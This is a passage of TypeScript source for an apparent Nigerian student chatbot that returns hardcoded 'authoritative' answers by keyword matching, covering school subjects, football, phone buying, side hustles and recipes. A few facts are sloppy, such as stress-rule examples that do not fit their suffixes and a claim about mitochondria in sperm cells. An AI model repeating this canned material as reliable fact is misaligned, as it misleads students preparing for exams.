6. **Saturn:** Spectacular ring system composed of billions of ice, dust, and rock chunks.
7. **Uranus:** Ice giant, rotates on its side (98° axial tilt).
8. **Neptune:** Furthest planet, deep blue, fastest supersonic wind speeds.
*(Pluto was classified as a dwarf planet by the IAU in 2006).*

**2. Rotation vs Revolution of the Earth:**
- **Rotation (24 Hours):** Earth spins on its axis once every 24 hours $\\implies$ Causes **Day and Night**.
- **Revolution (365¼ Days):** Earth orbits the Sun once every year $\\implies$ Combined with Earth's 23.5° axial tilt, causes the **Seasons** (Spring, Summer, Autumn, Winter; Dry & Rainy seasons in the tropics).

**3. Solar vs Lunar Eclipses:**
- **Solar Eclipse:** Moon comes directly between Sun and Earth (**Sun - Moon - Earth**). Moon casts a shadow on Earth during daytime.
- **Lunar Eclipse:** Earth comes directly between Sun and Moon (**Sun - Earth - Moon**). Earth blocks sunlight from reaching the Moon during full moon.`;
  }

  // World Geography & Capitals
  if (q.includes('capital') || q.includes('country') || q.includes('continent') || q.includes('ocean') || q.includes('lagos') || q.includes('abuja') || q.includes('nigeria') && (q.includes('state') || q.includes('river') || q.includes('flag'))) {
    return `### 🌍 Naija AI World Geography & Nigerian Geopolitics

Hello **${name}**! Here is the quick, authoritative geographical reference:

**1. Key World & African Capitals:**
- **Nigeria:** **Abuja** (Federal Capital Territory, since 1991; Lagos was the former capital and remains the economic/financial hub).
- **Ghana:** Accra | **Kenya:** Nairobi | **South Africa:** Pretoria (Executive), Cape Town (Legislative), Bloemfontein (Judicial) | **Egypt:** Cairo.
- **United Kingdom:** London | **United States:** Washington, D.C. | **Canada:** Ottawa.
- **France:** Paris | **Germany:** Berlin | **Italy:** Rome | **Spain:** Madrid.
- **China:** Beijing | **Japan:** Tokyo | **India:** New Delhi | **Russia:** Moscow.
- **Brazil:** Brasília | **Australia:** Canberra (Sydney is largest city, not the capital).

**2. Nigerian Geography & Landmarks:**
- **36 States and 1 Federal Capital Territory (FCT).**
- **Six Geopolitical Zones:**
  - North Central, North East, North West, South East, South South, South West.
- **The Confluence City:** **Lokoja** (Kogi State), where River Niger and River Benue meet into a distinct 'Y'-shaped river system.
- **Highest Point in Nigeria:** Chappal Waddi (Taraba State, ~2,419m).
- **The Nigerian Flag:** Designed by **Michael Taiwo Akinkunmi** in 1959 (Green: Agricultural wealth; White: Peace and unity).

**3. Continents & Oceans of the World:**
- **7 Continents (by size):** Asia (largest), Africa, North America, South America, Antarctica, Europe, Australia.
- **5 Oceans (by size):** Pacific (largest & deepest), Atlantic, Indian, Southern, Arctic (smallest).`;
  }

  // History: Nigerian Independence & World Wars
  if (q.includes('independence') || q.includes('history') || q.includes('world war') || q.includes('lugard') || q.includes('amalgamation') || q.includes('united nations') || q.includes('civil war') || q.includes('biafra')) {
    return `### 📜 Naija AI History Desk: Nigeria & Global Landmarks

Hello **${name}**! Here is the historical chronology tested across Nigerian curricula:

**1. Nigerian History Milestones:**
- **1914 Amalgamation:** Lord Frederick Lugard amalgamated the Northern and Southern Protectorates with the Colony of Lagos to form modern Nigeria. (Flora Shaw suggested the name "Nigeria" from the Niger River).
- **October 1, 1960 (Independence Day):** Nigeria gained full independence from British colonial rule. **Sir Abubakar Tafawa Balewa** became Prime Minister; **Dr. Nnamdi Azikiwe** became Governor-General.
- **October 1, 1963 (Republic Day):** Nigeria became a Federal Republic, cutting constitutional ties to the British Monarchy. Dr. Nnamdi Azikiwe became the first President.
- **1967 – 1970 (The Nigerian Civil War):** Also known as the Biafran War, fought between the Federal Government under Gen. Yakubu Gowon and the secessionist Republic of Biafra led by Col. Odumegwu Ojukwu. Concluded in January 1970 with the declaration of "No victor, no vanquished".
- **May 29, 1999:** Return to democratic rule marking the beginning of the Fourth Republic (Gen. Olusegun Obasanjo elected President).

**2. Major Global History Milestones:**
- **World War I (1914–1918):** Sparked by the assassination of Archduke Franz Ferdinand in Sarajevo; ended with the Treaty of Versailles (1919) and the establishment of the League of Nations.
- **World War II (1939–1945):** Axis Powers (Germany, Italy, Japan) vs Allied Powers (Britain, USSR, USA, France). Concluded after Allied victory in Europe and the atomic bombings of Hiroshima and Nagasaki in August 1945.
- **United Nations (UN):** Established on **October 24, 1945** to maintain global peace and security. Headquartered in New York City with 5 permanent Security Council members (USA, UK, France, Russia, China).`;
  }

  // Civics, Politics & Governance
  if (q.includes('democracy') || q.includes('separation of power') || q.includes('rule of law') || q.includes('executive') || q.includes('legislat') || q.includes('judiciar') || q.includes('citizen')) {
    return `### 🏛️ Naija AI Civics & Government: Arms of Government & Democracy

Hello **${name}**! Here is the foundational breakdown of political governance:

**1. The Three Arms of Government (Separation of Powers):**
- **The Legislature (Makes Laws):**
  - In Nigeria: The **National Assembly** (Bicameral: Senate with 109 Senators, House of Representatives with 360 members).
- **The Executive (Enforces & Executes Laws):**
  - Led by the President, Governors, Ministers, Commissioners, and civil service agencies.
- **The Judiciary (Interprets Laws & Adjudicates Disputes):**
  - Supreme Court (highest court in Nigeria), Court of Appeal, Federal/State High Courts.
- **Checks and Balances:** Montesquieu's doctrine ensuring no single organ becomes tyrannical (e.g. the President can veto bills; Legislature can impeach; Judiciary can declare acts unconstitutional).

**2. Core Pillars of Democracy:**
- **Popular Sovereignty:** Government derives legitimacy from the consent of the governed through free, fair, and periodic elections.
- **The Rule of Law (A.V. Dicey):**
  1. Supremacy of the law (no one is above the law).
  2. Equality before the law.
  3. Protection of fundamental human rights.`;
  }

  // Literature: Figures of Speech & Literary Devices
  if (q.includes('metaphor') || q.includes('simile') || q.includes('figure of speech') || q.includes('irony') || q.includes('personification') || q.includes('hyperbole') || q.includes('poem') || q.includes('drama') || q.includes('prose') || q.includes('achebe')) {
    return `### 📚 Naija AI Literature in English: Figures of Speech & Literary Devices

Hello **${name}**! Master these literary devices to score high in Literature in English:

**1. Figures of Comparison & Resemblance:**
- **Simile:** Direct comparison between two unlike things using *"as"* or *"like"*:
  - *Example:* "He fought **like** a lion in the battlefield."
- **Metaphor:** Direct identification without comparison words (saying one thing *is* another):
  - *Example:* "Education is the key to freedom."
- **Personification:** Giving human qualities or emotions to inanimate objects or abstract concepts:
  - *Example:* "The wind whispered through the night."

**2. Figures of Emphasis & Contrast:**
- **Hyperbole:** Deliberate, bold exaggeration for dramatic effect:
  - *Example:* "I have told you this a million times!"
- **Oxymoron:** Placing two contradictory terms side-by-side:
  - *Example:* "A bitter-sweet memory", "Deafening silence", "Original copy".
- **Irony:** The expression of meaning through language that signifies the opposite (Verbal, Situational, Dramatic):
  - *Example:* A fire station burning down.
- **Alliteration:** Repetition of initial consonant sounds in close succession:
  - *Example:* "**P**eter **p**icked a **p**eck of **p**ickled **p**eppers."
- **Onomatopoeia:** Words that imitate the sound they describe (e.g. *buzz, hiss, clang, boom*).

**3. Celebrated African Literary Icons:**
- **Chinua Achebe:** Father of modern African literature (*Things Fall Apart*, *No Longer at Ease*, *Arrow of God*).
- **Wole Soyinka:** First African Nobel Laureate in Literature (1986) (*The Lion and the Jewel*, *Death and the King's Horseman*).`;
  }

  // Computer Science, Internet & Artificial Intelligence
  if (q.includes('computer') || q.includes('internet') || q.includes('artificial intelligence') || q.includes('binary') || q.includes('ram') || q.includes('cpu') || q.includes('machine learning') || q.includes('software')) {
    return `### 💻 Naija AI Tech & Computer Science: How Technology Works

Hello **${name}**! Here is the clear, structured breakdown of modern computing and technology:

**1. How Computers Work (Hardware Architecture):**
- **CPU (Central Processing Unit):** The "brain" of the computer that executes instructions via the **Fetch-Decode-Execute** cycle (measured in GHz).
- **RAM (Random Access Memory):** High-speed temporary working memory. Volatile (data vanishes when power is cut).
- **Storage (SSD / HDD):** Permanent non-volatile storage for files, operating systems, and programs.
- **Binary System (Base 2):** Computers process everything in **0s and 1s** (high vs low electrical voltage).
  - 1 Bit = a single 0 or 1.
  - 8 Bits = **1 Byte** (can represent one letter or character).
  - 1 Kilobyte (KB) = 1,024 Bytes | 1 Megabyte (MB) = 1,024 KB | 1 Gigabyte (GB) = 1,024 MB.

**2. How the Internet Works:**
- **IP Address:** Unique numerical address assigned to every device on a network (like a digital home address).
- **DNS (Domain Name System):** The "phonebook of the internet" that translates human names (like \`google.com\`) into computer IP addresses (\`142.250.190.46\`).
- **HTTP / HTTPS:** Protocols for transferring web pages; **HTTPS** is encrypted with TLS/SSL to prevent eavesdropping.

**3. What is Artificial Intelligence (AI)?**
- **Artificial Intelligence (AI):** Machines simulating human cognitive functions like pattern recognition, reasoning, and problem solving.
- **Machine Learning (ML):** A subset of AI where computers learn patterns from large datasets rather than following rigid, pre-written rules.
- **Large Language Models (LLMs):** Deep neural networks trained on massive text corpora to predict the most probable next words in context!`;
  }

  // English: Concord & Oral English
  if (q.includes('concord') || q.includes('agreement') || q.includes('stress') || q.includes('vowel') || top.includes('concord') || top.includes('oral')) {
    return `### 💡 Naija AI Masterclass: Concord Rules & Oral English Stress

Hello **${name}**! Master these grammatical rules to score 90%+ in JAMB Use of English:

**1. Golden Concord Rules:**
- **Rule of Proximity (Neither...Nor / Either...Or):** Verb agrees with the subject closest to it:
  - *"Neither the teacher nor the students **were** present."* (Plural).
  - *"Neither the students nor the teacher **was** present."* (Singular).
- **Parenthetical Expressions:** Phrases like *as well as, accompanied by, together with, in addition to* do NOT change the number of the true grammatical subject:
  - *"The Governor, together with his commissioners, **is** addressing the press."*
- **Indefinite Pronouns are Singular:** *Each, everyone, someone, nobody, either* take singular verbs:
  - *"Each of the candidates **has** received an examination slip."*

**2. Oral English Stress Patterns:**
- **Noun vs Verb Stress:**
  - Nouns/Adjectives are stressed on syllable 1: **CON**duct, **PRO**duce, **EX**port, **PRE**sent.
  - Verbs are stressed on syllable 2: con**DUCT**, pro**DUCE**, ex**PORT**, pre**SENT**.
- **Suffix Rules:**
  - Words ending in *-tion, -sion, -ic*: Primary stress on penultimate syllable (edu**CA**tion, po**LI**tical).
  - Words ending in *-ate, -ise, -phy, -gy*: Primary stress on antepenultimate syllable (**PHO**tograph, de**MO**cracy).`;
  }

  // Economics, Government & Social Sciences
  if (q.includes('demand') || q.includes('supply') || q.includes('inflation') || q.includes('elastic') || q.includes('constitut') || q.includes('government')) {
    return `### 💡 Naija AI Masterclass: Economics & Nigerian Governance

Hello **${name}**! Here is the high-yield breakdown:

**1. Law of Demand and Price Elasticity ($E_d$):**
- Demand curve slopes downward from left to right (inverse relationship between price and quantity demanded).
$$E_d = \\frac{\\% \\Delta Q}{\\% \\Delta P} = \\frac{\\Delta Q}{\\Delta P} \\times \\frac{P_1}{Q_1}$$
- If $|E_d| > 1$: Elastic (luxuries with close substitutes).
- If $|E_d| < 1$: Inelastic (essential commodities like salt, petrol).

**2. Nigerian Constitutional Development:**
- **Clifford (1922):** Introduced the **elective principle** for the first time (4 legislative seats: 3 Lagos, 1 Calabar).
- **Richards (1946):** First constitution to divide Nigeria into three regions (North, West, East).
- **Macpherson (1951):** First constitution drafted after nationwide grassroots consultation.
- **Lyttelton (1954):** Officially made Nigeria a **true Federation** with regional premiers.
- **1963 Republican Constitution:** Replaced the Queen of England with an indigenous President; abolished the Privy Council.`;
  }

  // Exam Malpractice Mechanics & CBT Forensics
  if (q.includes('cheat') || q.includes('malpractice') || q.includes('runs') || q.includes('expo') || q.includes('miracle')) {
    return `### 🔍 Naija AI Unrestricted Intelligence: Exam Malpractice Mechanics & Forensic Detection

Hello **${name}**! Here is an exhaustive breakdown of how examination malpractice syndicates operate and how modern CBT bodies detect and apprehend offenders:

**⚡ Quick Key Takeaway:**
CBT examination boards (JAMB, WAEC, NECO) have deployed automated biometric screening, RF frequency scanners, permuted question seeds, and AI velocity monitoring. Cheating schemes are systematically detected and penalized under the Examination Malpractices Act No. 33 of 1999.

---

### 1. Common Malpractice Schemes Investigated by Authorities:
* **"Miracle Centers":** Compromised private testing centers that charge exorbitant fees promising assistance, frequently colluding with rogue staff.
* **Micro-Gadgets:** Concealed earpieces, smart wristwatches, and rogue Bluetooth pens used to transmit questions out of the hall.
* **Pre-Exam "Runs":** Fake question papers circulated on WhatsApp or Telegram by syndicates exploiting desperate students.

---

### 2. Modern Anti-Cheat Forensics (How Cheaters Are Caught):
1. **Biometric & Facial Recognition:** 10-finger biometric scans and facial matching at registration and test check-in prevent impersonators.
2. **RF Radio Frequency Scanners:** Mobile detectors in examination halls detect live wireless and radio emissions from hidden earpieces.
3. **Scrambled CBT Seeds:** Every candidate receives a uniquely permuted sequence of questions and randomized options ($A, B, C, D$). Copying another candidate's screen leads to instant failure.
4. **Algorithmic Velocity Proctoring:** Automated systems track click velocity and question dwell times. Submitting 50 complex calculation questions in 3 minutes triggers an automatic flag for investigation.`;
  }

  // =========================================================================
  // 4B. REAL-WORLD, OUTSIDE-SCHOOL & LIFESTYLE KNOWLEDGE
  // (SPORTS, TECH, BUSINESS, MONEY, FOOD, CULTURE, ENTERTAINMENT)
  // =========================================================================

  // Sports & Football: UEFA Champions League, Premier League, Super Eagles, Ballon d'Or
  if (
    q.includes('champions league') || q.includes('uefa') || q.includes('premier league') || q.includes('epl') ||
    q.includes('real madrid') || q.includes('man city') || q.includes('arsenal') || q.includes('chelsea') || q.includes('barcelona') || q.includes('manchester united') ||
    q.includes('ballon d\'or') || q.includes('ballon dor') || q.includes('world cup') || q.includes('super eagles') || q.includes('osimhen') || q.includes('afcon') ||
    q.includes('messi') || q.includes('ronaldo') || q.includes('haaland') || q.includes('mbappe') || q.includes('football') || q.includes('soccer')
  ) {
    if (q.includes('champions league') || q.includes('uefa')) {
      return `### ⚽ Naija AI Sports Desk: UEFA Champions League Intelligence

Hello **${name}**! Here is the authentic breakdown of the UEFA Champions League:

**⚡ Quick Key Takeaway:**
Real Madrid is the undisputed king of European football, having clinched a record-extending **15 UEFA Champions League titles** (most recently defeating Borussia Dortmund 2-0 at Wembley in 2024 with goals from Dani Carvajal and Vinícius Júnior).

---

### 1. 🏆 Landmark Records & All-Time Champions:
* **Real Madrid:** 15 Titles (1956–1960, 1966, 1998, 2000, 2002, 2014, 2016, 2017, 2018, 2022, 2024).
* **AC Milan:** 7 Titles.
* **Liverpool & Bayern Munich:** 6 Titles each.
* **Barcelona:** 5 Titles.
* **Manchester City:** 1 Title (Historic treble in 2023 under Pep Guardiola).

---

### 2. ⚡ New Champions League Format (36-Team Swiss League Phase):
Starting from the 2024/25 season, UEFA officially abolished the traditional 4-team group stage:
* **Single 36-Club League Table:** Every club plays 8 different opponents (4 home, 4 away).
* **Direct Qualification:** Top 8 teams advance automatically to the Round of 16.
* **Play-off Round:** Teams ranking 9th to 24th battle in a two-legged knockout playoff.
* **No Drop to Europa League:** Teams eliminated in the league phase are completely out of Europe!

---

### 3. 🇳🇬 Nigerian Stars Who Won the UEFA Champions League:
* **Finidi George & Nwankwo Kanu:** Ajax Amsterdam (1995 against AC Milan).
* **John Obi Mikel:** Chelsea FC (Heroic 2012 triumph against Bayern Munich in Munich).

*Who is your favorite club or player in this season's Champions League? Just ask for match previews, squad analysis, or head-to-head stats!*`;
    }

    if (q.includes('messi') || q.includes('ronaldo') || q.includes('goat')) {
      return `### ⚽ Naija AI Sports Desk: The G.O.A.T Debate — Lionel Messi vs Cristiano Ronaldo

Hello **${name}**! Here is the objective, statistical breakdown of football's greatest rivalry:

**⚡ Quick Key Takeaway:**
Both Lionel Messi and Cristiano Ronaldo redefined sports history over two decades. Messi leads in team honors (FIFA World Cup 2022, 8 Ballon d'Or trophies, 4 Champions Leagues), while Ronaldo leads in all-time official career goals (900+ official goals), 5 Champions Leagues, and 5 Ballon d'Or awards.

---

### 📊 Head-to-Head Comparison:
* **All-Time Career Goals:**
  - **Cristiano Ronaldo:** 900+ official goals (All-time top scorer in men's football history & Champions League top scorer with 140 goals).
  - **Lionel Messi:** 840+ official goals & 375+ assists (Highest all-time goal contributions in football history).
* **Ballon d'Or Awards:**
  - **Messi:** 8 (2009, 2010, 2011, 2012, 2015, 2019, 2021, 2023).
  - **Ronaldo:** 5 (2008, 2013, 2014, 2016, 2017).
* **International Honors:**
  - **Messi:** FIFA World Cup (2022), Copa América (2021, 2024), Olympic Gold (2008).
  - **Ronaldo:** UEFA European Championship (Euro 2016), UEFA Nations League (2019).

*Whether you favor Ronaldo's relentless work ethic and aerial athleticism or Messi's innate vision and magical dribbling, both are living legends of the sport!*`;
    }

    return `### ⚽ Naija AI Sports Desk: Football Intelligence & Analysis

Hello **${name}**! Here is the breakdown for your sports inquiry on **"${message.trim()}"**:

**⚡ Quick Key Takeaway:**
Football is constantly evolving with high-intensity pressing, transitional counter-attacks, and advanced data analytics across the Premier League, La Liga, Serie A, and African football (AFCON).

---

### 1. Key Highlights & Current Landscape:
* **European Domination:** The English Premier League and Spanish La Liga continue to dominate European revenue and coefficient rankings, with Manchester City, Real Madrid, Arsenal, and Bayern Munich competing at the pinnacle.
* **African Football & Super Eagles:** Nigeria's Super Eagles, led by African Footballer of the Year Victor Osimhen and Ademola Lookman, reached the 2023 AFCON final and remain one of the most talent-rich squads on the continent.
* **Tactical Modernization:** Modern managers prioritize inverted fullbacks, box-midfield overloads, and high line pressing over rigid defensive blocks.

*Need specific team news, transfer updates, tactical breakdown, or historical statistics? Ask Naija AI anytime!*`;
  }

  // Smartphones, Gadgets & Buying Advice in Nigeria
  if (
    q.includes('phone') || q.includes('smartphone') || q.includes('infinix') || q.includes('tecno') ||
    q.includes('samsung') || q.includes('iphone') || q.includes('redmi') || q.includes('xiaomi') ||
    q.includes('laptop') || q.includes('specs') || q.includes('battery health')
  ) {
    return `### 📱 Naija AI Tech Desk: Smartphone & Gadget Buying Guide (Nigeria)

Hello **${name}**! Here is practical, market-tested buying advice for smartphones and gadgets in Nigeria:

**⚡ Quick Key Takeaway:**
When buying a phone in Nigeria, prioritize: **Battery capacity (5,000mAh+ with 33W+ fast charging)**, **clean processor (MediaTek Helio G99 / Dimensity or Snapdragon)**, and **minimum 8GB RAM (or 4GB+4GB extended) with 128GB/256GB storage** to prevent lag during daily multitasking and gaming.

---

### 1. 🏆 Best Recommendations by Budget Tier:
* **Budget Tier (₦90,000 – ₦150,000):**
  - **Tecno Spark 20 / Pop 8:** Excellent battery endurance, smooth 90Hz display, and dual SIM reliability.
  - **Infinix Hot 40i / Smart 8:** Great value for social media, WhatsApp, and daily browsing.
  - **Redmi 13C / A3:** Clean software, decent camera, and solid build quality.
* **Mid-Range Power (₦160,000 – ₦300,000):**
  - **Redmi Note 13 (4G/5G):** Stunning AMOLED 120Hz display, 108MP camera, and 33W fast charging.
  - **Infinix Note 40 / Note 30:** Wireless magnetic charging, JBL tuned audio, and Helio G99 gaming processor.
  - **Samsung Galaxy A15 / A25:** 4 years of guaranteed Android OS updates, bright Super AMOLED screen, and strong resale value.
* **Flagship / Premium (₦400,000+):**
  - **iPhone 13 / 14 / 15:** Industry-leading video recording, iOS optimization, and supreme long-term value.
  - **Samsung Galaxy S23 / S24 Ultra:** Unmatched zoom photography, S-Pen productivity, and Snapdragon 8 Gen 3 performance.

---

### 2. 💡 Practical Buying & Maintenance Tips in Nigeria:
1. **Always Verify IMEI Before Paying:** Dial \`*#06#\` and match the IMEI on the phone screen with the box sticker.
2. **Watch Out for "Refurbished / UK-Used":** Check battery health on iPhones (ensure 85%+ original battery) and test True Tone / Face ID.
3. **Use Surge Protectors:** Nigeria's voltage fluctuations from generators / NEPA can fry charging ICs. Always use an original certified adapter with a surge guard.`;
  }

  // Business, Side Hustles, Freelancing & Making Money in Nigeria
  if (
    q.includes('side hustle') || q.includes('make money') || q.includes('pos business') ||
    q.includes('mini importation') || q.includes('freelanc') || q.includes('upwork') || q.includes('fiverr') ||
    q.includes('start a business') || q.includes('investment') || q.includes('investing') || q.includes('business idea')
  ) {
    return `### 💼 Naija AI Business & Career: High-Yield Side Hustles & Freelancing in Nigeria

Hello **${name}**! Here is a realistic, practical roadmap for earning legitimate income and building profitable side hustles in Nigeria:

**⚡ Quick Key Takeaway:**
The most sustainable ways to make money in Nigeria leverage **digital freelance skills (earning in foreign currency: USD/GBP)** or **high-frequency local cashflow businesses (POS terminal operations, food delivery, mini-importation)**. Avoid "get-rich-quick" doubling schemes which are 100% Ponzi scams.

---

### 1. 🚀 Top Practical Side Hustles in Nigeria:
1. **High-Demand Digital Freelancing (Upwork, Fiverr, LinkedIn):**
   - **Skills:** UI/UX design (Figma), frontend web development, video editing (CapCut / Premiere Pro), copy/content writing, and virtual assistance.
   - **How to Receive Foreign Payments:** Use virtual dollar accounts like **Grey, Geegpay, or Payoneer** to receive client payments at fair market exchange rates.
2. **Agency Banking / POS Business:**
   - **Startup Capital:** ₦50,000 – ₦150,000 for terminal and working capital float.
   - **Location:** High foot-traffic areas (bus stops, markets, student hostels) with scarce ATMs. Earn ₦100–₦300 per withdrawal/transfer.
3. **Mini-Importation & E-Commerce:**
   - Source trending gadgets, jewelry, or phone accessories directly from 1688 / AliExpress and sell via WhatsApp Status, Instagram, and TikTok Shop.
4. **Smartphone Graphic & Content Creation:**
   - Businesses in Lagos, Abuja, and Port Harcourt pay ₦30,000–₦100,000 monthly for regular social media flyers, carousels, and promotional reels created using Canva and CapCut.

---

### 2. 🛡️ Financial Golden Rules in Nigeria:
* **Protect Against Inflation:** Don't leave idle cash in standard savings accounts yielding 2% while inflation is high. Use dollar savings or mutual funds.
* **Rule of 3 P's:** Any platform promising "guaranteed 30% weekly profit without risk" is a Ponzi syndicate. Protect your hard-earned capital.`;
  }

  // Food, Cooking & Nigerian Lifestyle
  if (
    q.includes('jollof') || q.includes('egusi') || q.includes('how to cook') || q.includes('recipe') ||
    q.includes('pepper soup') || q.includes('fried rice') || q.includes('suya') ||
    q.includes('burna') || q.includes('wizkid') || q.includes('davido') || q.includes('afrobeats')
  ) {
    if (q.includes('jollof')) {
      return `### 🍲 Naija AI Kitchen: The Ultimate Authentic Nigerian Party Jollof Rice Secrets

Hello **${name}**! Here is the master secret to achieving that authentic, smoky Nigerian Party Jollof Rice flavor at home:

**⚡ Quick Key Takeaway:**
The legendary "Party Jollof" aroma comes from three non-negotiable factors: **The Pepper Base Blend (Tatashe & Shombo)**, **Frying the Tomato Paste until the oil floats**, and **Trapping steam with aluminum foil so the bottom burns slightly to create that signature woodsmoke flavor**.

---

### 🛒 Ingredients:
* 4 cups long grain Parboiled Rice (well washed).
* **Pepper Mix:** 5 red bell peppers (Tatashe), 4 Scotch bonnet peppers (Ata Rodo), 3 large onions, 6 fresh plum tomatoes, 4 cayenne peppers (Shombo).
* 200g concentrated tomato paste.
* Rich Meat Stock (beef, chicken, or goat meat stock).
* Spices: Thyme, Curry powder, Nutmeg, Bay leaves (4-5 leaves), crushed garlic & ginger, seasoning cubes, salt.
* 1 cup vegetable oil & 2 tablespoons butter.

---

### 👨‍🍳 Step-by-Step Cooking Technique:
1. **The Pepper Reduction:** Blend your peppers, onions, and tomatoes smoothly. Boil in a pot until all excess water evaporates and you are left with a thick paste.
2. **The Base Fry:** Heat oil and butter in a large heavy-bottom pot. Add chopped onions, thyme, and bay leaves. Fry the concentrated tomato paste for 5–7 minutes until it loses its sour tang. Add the boiled pepper mix and fry until oil separates to the top.
3. **The Stock Infusion:** Pour in your rich meat stock. Season with curry, thyme, white pepper, and bouillon cubes. Taste the sauce—it must taste slightly over-seasoned because the rice will absorb the flavor!
4. **The Steam Cook (The Game Changer):** Add your washed raw rice. The liquid level should just barely cover the rice. Cover the pot with **aluminum foil**, then press the lid tightly over it. Lower heat to medium-low. The rice cooks in the trapped steam, NOT swimming in water!
5. **The Party Smoke Finish:** Once the water is absorbed, turn the heat to high for 3–5 minutes. Allow the bottom layer to burn slightly into dark brown crusts. Stir with a spatula to distribute that unforgettable smoky aroma throughout the pot!

*Serve hot with fried plantains (Dodo), crispy chicken, and coleslaw! Enjoy!*`;
    }

    return `### 🍲 Naija AI Lifestyle & Culture: Authentic Nigerian Food & Music

Hello **${name}**! Here is the breakdown for your inquiry on **"${message.trim()}"**:

**⚡ Quick Key Takeaway:**
Nigerian culture represents one of the most vibrant, expressive, and globally influential movements in the world—from world-renowned delicacies (Jollof rice, Egusi soup with pounded yam, Suya) to the global Afrobeats sound led by Burna Boy, Wizkid, Davido, Rema, and Asake.

---

### 1. Cultural Highlights:
* **Afrobeats to the World:** Nigerian artists sell out Madison Square Garden, O2 Arena, and top global charts. The fusion of traditional highlife, fuji rhythms, and modern pop production has made Nigerian music an international powerhouse.
* **Culinary Excellence:** Nigerian cuisine relies on rich palm oil, slow-roasted spices (suya yaji pepper), crayfish, dried fish, and rich vegetable soups celebrated globally.

*Need step-by-step recipes, music history, or lifestyle tips? Just ask Naija AI!*`;
  }


  // =========================================================================
  // 5. UNIVERSAL FACT ENGINE & EXPANSIVE SUBJECT DICTIONARY
  // Delivers precise, factual, academic answers to ANY question across all domains!
  // =========================================================================

  // Extensive Factual Term Knowledge Base
  const FACTUAL_DICTIONARY: Record<string, { title: string; category: string; definition: string; details: string[]; exampleOrFormula?: string; examTip: string }> = {
    // Biology & Life Sciences
    'photosynthesis': {
      title: 'Photosynthesis',
      category: 'Biology / Plant Physiology',
      definition: 'The biochemical process by which green plants and algae synthesize glucose from carbon dioxide and water using light energy absorbed by chlorophyll.',
      details: [
        'Occurs primarily in plant leaf mesophyll cells inside specialized organelles called chloroplasts.',
        'Equation: 6CO₂ + 6H₂O + Sunlight → C₆H₁₂O₆ + 6O₂.',
        'Comprises two phases: Light-dependent reactions (in thylakoids; photolysis of water produces ATP and NADPH, releasing O₂) and the Light-independent Calvin Cycle (in stroma; CO₂ is fixed into sugar).'
      ],
      exampleOrFormula: '6CO_2 + 6H_2O \\xrightarrow{\\text{Light/Chlorophyll}} C_6H_{12}O_6 + 6O_2',
      examTip: 'Examiners often test the limiting factors: light intensity, CO₂ concentration, and temperature.'
    },
    'osmosis': {
      title: 'Osmosis',
      category: 'Biology / Cellular Transport',
      definition: 'The net movement of water molecules from a region of higher water potential (dilute solution) to a region of lower water potential (concentrated solution) through a selectively permeable membrane.',
      details: [
        'Passive transport process requiring no metabolic energy (ATP).',
        'In plant cells: Placed in hypotonic (dilute) water, cells become turgid (cell wall prevents bursting); in hypertonic solutions, cells undergo plasmolysis.',
        'In animal cells: Placed in pure water, cells swell and undergo lysis (bursting) due to lack of a rigid cell wall.'
      ],
      examTip: 'Remember: Osmosis refers strictly to the movement of WATER molecules across a semi-permeable membrane.'
    },
    'diffusion': {
      title: 'Diffusion',
      category: 'Biology & Physics',
      definition: 'The net movement of particles (atoms, ions, or molecules) from a region of higher concentration to a region of lower concentration down a concentration gradient.',
      details: [
        'Driven by the random kinetic energy of particles (Brownian motion).',
        'Rate of diffusion increases with higher temperature, steeper concentration gradient, smaller particle size, and larger surface area to volume ratio (Fick’s Law).'
      ],
      examTip: 'Gaseous exchange in human alveoli and plant stomata occurs entirely by simple diffusion.'
    },
    'enzyme': {
      title: 'Enzymes',
      category: 'Biology / Biochemistry',
      definition: 'Biological catalysts, typically protein molecules, that speed up metabolic chemical reactions by lowering the activation energy without being consumed.',
      details: [
        'Possess a specific active site that binds to matching substrate molecules (Lock and Key / Induced Fit model).',
        'Highly specific to their substrate and sensitive to temperature and pH (denature at high temperatures, typically above 45°C–50°C).'
      ],
      examTip: 'Optimum pH varies widely: Pepsin in stomach works at pH ~2, while Trypsin in duodenum operates at pH ~8.'
    },
    'mitochondria': {
      title: 'Mitochondrion (The Cell Powerhouse)',
      category: 'Cell Biology',
      definition: 'Double-membraned organelle responsible for generating the vast majority of cellular chemical energy in the form of Adenosine Triphosphate (ATP) via aerobic cellular respiration.',
      details: [
        'Outer membrane is smooth, while inner membrane is folded into cristae to dramatically increase surface area for electron transport enzymes.',
        'Contains its own circular mitochondrial DNA (mtDNA) and 70S ribosomes, supporting the endosymbiotic theory.'
      ],
      examTip: 'Tissues with high metabolic energy demands (like heart muscle, sperm cells, and liver) contain thousands of mitochondria.'
    },
    'ecosystem': {
      title: 'Ecosystem',
      category: 'Ecology',
      definition: 'A biological community of interacting organisms (biotic factors) and their physical, non-living environment (abiotic factors: temperature, water, sunlight, soil).',
      details: [
        'Energy flows unidirectionally from the Sun through primary producers (autotrophs) to consumers and decomposers, dissipating as heat (10% ecological efficiency rule).',
        'Nutrients (carbon, nitrogen, phosphorus) cycle continuously through biogeochemical cycles.'
      ],
      examTip: 'A food chain shows a single pathway of energy flow, whereas a food web shows complex interconnected feeding relationships.'
    },
    'vaccine': {
      title: 'Vaccines & Immunization',
      category: 'Medicine / Immunology',
      definition: 'A biological preparation that provides active acquired immunity to a specific infectious disease by training the immune system to recognize pathogens.',
      details: [
        'Contains weakened (attenuated), killed, or protein subunits of a pathogen (or mRNA instructions).',
        'Stimulates B-lymphocytes to produce specific antibodies and develop long-lived memory cells without causing the full-blown illness.',
        'When vaccinated individuals encounter the actual pathogen in the future, memory cells mount a rapid, potent secondary immune response.'
      ],
      examTip: 'Active immunity produces lasting memory cells, whereas passive immunity (e.g. maternal antibodies through breast milk) gives immediate but temporary protection.'
    },
    'malaria': {
      title: 'Malaria & Vector Biology',
      category: 'Biology / Parasitology',
      definition: 'A life-threatening parasitic infectious disease caused by Plasmodium protozoa transmitted to humans through the bites of infected female Anopheles mosquitoes.',
      details: [
        'Species affecting humans: Plasmodium falciparum (most lethal in sub-Saharan Africa), P. vivax, P. malariae, and P. ovale.',
        'Life cycle involves two hosts: Sexual reproduction inside the female Anopheles mosquito vector, and asexual multiplication in human liver cells and red blood cells (erythrocytes).',
        'Symptoms: Chills, high fever, profuse sweating, headache, anemia, and splenomegaly.',
        'Prevention: Insecticide-treated nets (ITNs), indoor residual spraying, draining stagnant breeding water, and antimalarial medications (Artemisinin-based combination therapies, ACTs).'
      ],
      examTip: 'Heterozygous sickle cell carriers (HbA HbS genotype) possess natural selective resistance against severe falciparum malaria.'
    },

    // Physics & Mathematics
    'gravity': {
